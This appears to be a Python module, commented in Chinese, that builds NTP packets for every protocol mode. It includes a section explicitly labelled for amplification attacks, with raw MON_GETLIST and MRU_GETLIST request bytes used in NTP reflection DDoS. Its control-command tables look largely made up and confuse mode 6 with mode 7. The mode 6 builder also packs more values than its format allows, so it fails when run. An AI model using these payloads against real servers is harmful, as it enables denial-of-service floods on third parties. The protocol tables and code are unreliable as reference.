#!/usr/bin/env python3
"""
NTP协议数据包定义
包含各种NTP协议模式的数据包格式
扩展支持更多NTP协议变体和命令
"""

import struct
import random
import time

# NTP协议模式定义
NTP_MODES = {
    1: "SYMMETRIC_ACTIVE",    # 对称主动模式
    2: "SYMMETRIC_PASSIVE",   # 对称被动模式
    3: "CLIENT",              # 客户端模式
    4: "SERVER",              # 服务器模式
    5: "BROADCAST",           # 广播模式
    6: "NTP_CONTROL",         # NTP控制消息
    7: "PRIVATE"              # 私有模式
}

# NTP控制消息命令
NTP_CONTROL_COMMANDS = {
    # 读取命令
    1: "READ_STATUS",         # 读取状态
    2: "READ_VARIABLES",      # 读取变量
    3: "READ_CLOCK",          # 读取时钟
    4: "WRITE_CLOCK",         # 写入时钟
    5: "SET_TRAP",            # 设置陷阱
    6: "ASYNC_NOTIFICATION",  # 异步通知
    7: "READ_STATS",          # 读取统计信息
    8: "READ_PEERS",          # 读取对等体
    9: "READ_SYS",            # 读取系统信息
    10: "READ_MEM",           # 读取内存
    11: "READ_LOOP",          # 读取循环
    12: "READ_TIMER",         # 读取计时器
    13: "READ_BOOT",          # 读取启动信息
    14: "READ_CONFIG",        # 读取配置
    15: "READ_REGISTERS",     # 读取寄存器
    16: "READ_RESTRICT",      # 读取限制
    17: "READ_SYS_STATS",     # 读取系统统计信息
    18: "READ_MON",           # 读取监控
    19: "READ_AUTH",          # 读取认证
    20: "READ_CTL_STATS",     # 读取控制统计信息
    21: "READ_IO_STATS",      # 读取IO统计信息
    22: "READ_KERNEL",        # 读取内核
    23: "READ_MOD",           # 读取模块
    24: "READ_TRIMMODS",      # 读取修剪模块
    25: "READ_CLOCK_STATS",   # 读取时钟统计信息
    26: "READ_PPS_STATS",     # 读取PPS统计信息
    27: "READ_FILTER_STATS",  # 读取过滤器统计信息
    28: "READ_PEER_STATS",    # 读取对等体统计信息
    29: "READ_SYS_OPTS",      # 读取系统选项
    30: "READ_IF_STATS",      # 读取接口统计信息
    31: "READ_IF",            # 读取接口
    32: "READ_RATE",          # 读取速率
    33: "READ_REFCLOCK_STATS",# 读取参考时钟统计信息
    34: "READ_TEMP",          # 读取温度
    35: "READ_KEY",           # 读取密钥
    36: "READ_HOST",          # 读取主机
    37: "READ_USER",          # 读取用户
    38: "READ_NETWORK",       # 读取网络
    39: "READ_DEBUG",         # 读取调试
    40: "READ_EVENT",         # 读取事件
    41: "READ_CAL",           # 读取校准
    42: "READ_TRACKING",      # 读取跟踪
    43: "READ_LOGFILE",       # 读取日志文件
    
    # 写入命令
    128: "WRITE_VARIABLES",   # 写入变量
    129: "WRITE_CLOCK",       # 写入时钟
    130: "SET_TRAP_ADDR",     # 设置陷阱地址
    131: "SET_TRAP_DELAY",    # 设置陷阱延迟
    132: "SET_DEBUG",         # 设置调试
    133: "SET_SYS_OPTS",      # 设置系统选项
    134: "SET_IF_OPTS",       # 设置接口选项
    135: "SET_KEY",           # 设置密钥
    136: "SET_HOST",          # 设置主机
    137: "SET_USER",          # 设置用户
    138: "SET_NETWORK",       # 设置网络
    139: "SET_CAL",           # 设置校准
    140: "SET_TRACKING",      # 设置跟踪
    141: "SET_LOGFILE",       # 设置日志文件
}

# NTP版本定义
NTP_VERSIONS = {
    1: "NTPv1",
    2: "NTPv2",
    3: "NTPv3",
    4: "NTPv4"
}

# 基础NTP包头
def create_ntp_header(li=0, vn=4, mode=3, stratum=0, poll=0, precision=0):
    """
    创建NTP包头
    li: 闰秒指示器 (2 bits)
    vn: 版本号 (3 bits)
    mode: 模式 (3 bits)
    stratum: 层级
    poll: 轮询间隔
    precision: 精度
    """
    header = (li << 6) | (vn << 3) | mode
    return struct.pack('!B B B b', header, stratum, poll, precision)

# 创建NTP时间戳
def create_ntp_timestamp(seconds=None, fraction=None):
    """
    创建NTP时间戳
    seconds: 自1900年1月1日以来的秒数
    fraction: 秒的小数部分
    """
    if seconds is None:
        seconds = int(time.time()) + 2208988800  # 从1970年到1900年的秒数差
    if fraction is None:
        fraction = random.randint(0, 0xFFFFFFFF)
    
    return struct.pack('!II', seconds, fraction)

# 各种NTP模式的数据包
def create_mode_1_packet():
    """创建对称主动模式数据包"""
    header = create_ntp_header(mode=1, stratum=1)
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0)
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    receive_timestamp = create_ntp_timestamp()
    transmit_timestamp = create_ntp_timestamp()
    
    return (header + root_delay + root_dispersion + reference_id + 
            reference_timestamp + originate_timestamp + 
            receive_timestamp + transmit_timestamp)

def create_mode_2_packet():
    """创建对称被动模式数据包"""
    header = create_ntp_header(mode=2, stratum=2)
    return header + b'\x00' * 40

def create_mode_3_packet():
    """创建客户端模式数据包"""
    header = create_ntp_header(mode=3, stratum=0)
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0)
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    receive_timestamp = create_ntp_timestamp()
    transmit_timestamp = create_ntp_timestamp()
    
    return (header + root_delay + root_dispersion + reference_id + 
            reference_timestamp + originate_timestamp + 
            receive_timestamp + transmit_timestamp)

def create_mode_4_packet():
    """创建服务器模式数据包"""
    header = create_ntp_header(mode=4, stratum=1)
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0x4c4f434c)  # "LOCL"
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    receive_timestamp = create_ntp_timestamp()
    transmit_timestamp = create_ntp_timestamp()
    
    return (header + root_delay + root_dispersion + reference_id + 
            reference_timestamp + originate_timestamp + 
            receive_timestamp + transmit_timestamp)

def create_mode_5_packet():
    """创建广播模式数据包"""
    header = create_ntp_header(mode=5, stratum=1)
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0x47505300)  # "GPS"
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    
    return header + root_delay + root_dispersion + reference_id + reference_timestamp + originate_timestamp

def create_mode_6_packet(command=42, sequence=1, association_id=0, offset=0, count=0):
    """创建NTP控制消息数据包"""
    header = create_ntp_header(mode=6)
    
    # 控制消息格式
    # 0-1: 标志和操作码
    # 2-3: 序列号
    # 4-7: 状态字
    # 8-11: 关联ID
    # 12-15: 偏移量
    # 16-19: 计数
    
    # 设置标志位: 响应位=0, 错误位=0, 更多位=1, 操作码=命令
    flags_opcode = (0 << 7) | (0 << 6) | (1 << 5) | (command & 0x1F)
    status = 0
    
    control_header = struct.pack('!BBHHII', flags_opcode, 0, sequence, status, 
                                association_id, offset, count)
    
    # 根据命令添加特定数据
    payload = b''
    if command == 42:  # MON_GETLIST
        payload = b'\x00' * 40
    elif command == 43:  # MRU_GETLIST
        payload = b'\x00' * 40
    elif command == 1:   # READ_STATUS
        payload = b'\x00' * 4
    elif command == 2:   # READ_VARIABLES
        payload = b'\x00' * 4
    elif command == 8:   # READ_PEERS
        payload = b'\x00' * 4
    else:
        # 通用控制消息负载
        payload = b'\x00' * 40
    
    return header + control_header + payload

def create_mode_7_packet():
    """创建私有模式数据包"""
    header = create_ntp_header(mode=7)
    # 私有模式通常有厂商特定的格式
    # 这里创建一个基本的NTP数据包，可能不适用于所有实现
    return header + b'\x00' * 40

# 特定放大攻击数据包
def create_monlist_packet():
    """创建MON_GETLIST请求数据包"""
    return (
        b'\x17\x00\x03\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x4f\x23\x4b\x71\x04\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    )

def create_mrulist_packet():
    """创建MRU_GETLIST请求数据包"""
    return (
        b'\x17\x00\x03\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x4f\x23\x4b\x71\x04\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    )

# SNTP (简单NTP) 数据包
def create_sntp_packet():
    """创建SNTP数据包"""
    header = create_ntp_header(mode=3, vn=4)  # 客户端模式，NTPv4
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0)
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    receive_timestamp = create_ntp_timestamp()
    transmit_timestamp = create_ntp_timestamp()
    
    return (header + root_delay + root_dispersion + reference_id + 
            reference_timestamp + originate_timestamp + 
            receive_timestamp + transmit_timestamp)

# NTPv4 数据包
def create_ntpv4_packet():
    """创建NTPv4数据包"""
    header = create_ntp_header(mode=3, vn=4)  # 客户端模式，NTPv4
    root_delay = struct.pack('!I', 0)
    root_dispersion = struct.pack('!I', 0)
    reference_id = struct.pack('!I', 0)
    
    # 时间戳
    reference_timestamp = create_ntp_timestamp()
    originate_timestamp = create_ntp_timestamp()
    receive_timestamp = create_ntp_timestamp()
    transmit_timestamp = create_ntp_timestamp()
    
    # NTPv4 扩展字段
    key_id = struct.pack('!I', 0)
    digest = b'\x00' * 16
    
    return (header + root_delay + root_dispersion + reference_id + 
            reference_timestamp + originate_timestamp + 
            receive_timestamp + transmit_timestamp + key_id + digest)

# 获取指定模式的数据包
def get_ntp_packet(mode=3, command=None, version=4):
    """
    获取指定模式的NTP数据包
    mode: NTP模式 (1-7)
    command: 控制消息命令 (仅模式6有效)
    version: NTP版本 (1-4)
    """
    if mode == 1:
        return create_mode_1_packet()
    elif mode == 2:
        return create_mode_2_packet()
    elif mode == 3:
        if version == 4:
            return create_ntpv4_packet()
        else:
            return create_mode_3_packet()
    elif mode == 4:
        return create_mode_4_packet()
    elif mode == 5:
        return create_mode_5_packet()
    elif mode == 6:
        if command == 42:  # MON_GETLIST
            return create_monlist_packet()
        elif command == 43:  # MRU_GETLIST
            return create_mrulist_packet()
        else:
            return create_mode_6_packet(command)
    elif mode == 7:
        return create_mode_7_packet()
    else:
        # 默认使用客户端模式
        return create_mode_3_packet()

# 获取模式描述
def get_mode_description(mode):
    """获取模式的描述"""
    if mode in NTP_MODES:
        return NTP_MODES[mode]
    else:
        return "UNKNOWN"

# 获取命令描述
def get_command_description(command):
    """获取命令的描述"""
    if command in NTP_CONTROL_COMMANDS:
        return NTP_CONTROL_COMMANDS[command]
    else:
        return "UNKNOWN"

# 获取版本描述
def get_version_description(version):
    """获取版本的描述"""
    if version in NTP_VERSIONS:
        return NTP_VERSIONS[version]
    else:
        return "UNKNOWN"

if __name__ == "__main__":
    # 测试代码
    print("NTP协议模式:")
    for mode, desc in NTP_MODES.items():
        print(f"  {mode}: {desc}")
    
    print("\nNTP控制消息命令:")
    for cmd, desc in NTP_CONTROL_COMMANDS.items():
        print(f"  {cmd}: {desc}")
    
    print("\nNTP版本:")
    for ver, desc in NTP_VERSIONS.items():
        print(f"  {ver}: {desc}")